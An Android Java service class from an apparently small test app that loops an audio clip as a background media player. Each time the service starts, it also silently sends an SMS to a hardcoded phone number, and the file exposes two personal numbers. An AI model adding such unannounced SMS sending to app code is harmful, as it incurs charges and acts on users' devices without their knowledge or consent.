package com.evs.testapplication.sastabotique_local.services;

import android.app.Service;
import android.content.Intent;
import android.media.MediaPlayer;
import android.os.IBinder;
import android.support.annotation.IntDef;
import android.support.annotation.Nullable;
import android.telephony.SmsManager;

import com.evs.testapplication.sastabotique_local.R;

/**
 * Created by AQIB JAVED on 9/22/2018.
 */

public class MediaPlayerService extends Service {
    private MediaPlayer player;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(!player.isPlaying() && !player.isLooping()){
            player.setLooping(true);
            player.start();
        }
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+923206879426","+923237811992","Hi boy",null,null);
        return START_STICKY;
    }

    @Override
    public void onCreate() {
        player = MediaPlayer.create(getApplicationContext(), R.raw.iphone_6_original);
        super.onCreate();
    }

    @Override
    public void onDestroy() {
        player.stop();
        super.onDestroy();
    }
}
